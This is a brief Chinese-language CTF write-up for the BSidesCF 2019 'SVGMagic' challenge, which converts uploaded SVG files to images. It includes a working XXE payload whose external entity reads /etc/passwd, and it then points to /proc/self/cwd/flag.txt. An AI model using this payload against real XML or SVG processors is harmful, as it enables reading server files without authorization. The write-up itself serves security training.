# \[BSidesCF 2019]SVGMagic

## \[BSidesCF 2019]SVGMagic

## 考点

* SVG导致的XXE

## wp

题目功能是提供一个svg文件，然后可以把它转换为图片

SVG 是使用 XML 格式定义图形一种方式

```php
<svg version="1.1"
  baseProfile="full"
  width="300" height="200"
  xmlns="http://www.w3.org/2000/svg">
  <rect width="100%" height="100%" stroke="red" stroke-width="4" fill="yellow" />
  <circle cx="150" cy="100" r="80" fill="green" />
  <text x="150" y="115" font-size="16" text-anchor="middle" fill="white">RUNOOB SVG TEST</text>
</svg>
```

这段XML文档就对应如下图片

![](../.gitbook/assets/N008mCWA11EZebq35Zd7OnP\_S4XPRXbwKed5Qo4yoX0.png)

那这里可以尝试XXE

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY evil SYSTEM "file:///etc/passwd" >]>
<svg version="1.1"
  baseProfile="full"
  width="3000" height="2000"
  xmlns="http://www.w3.org/2000/svg">
  <text x="1500" y="1150" font-size="16" text-anchor="middle" fill="red">&evil;</text>
</svg>
```

可以看到返回，再去读取`/proc/self/cwd/flag.txt`

## 小结

* 文件包含多考虑`/proc`文件，本题`/proc/self/cwd` 就是当前脚本的路径
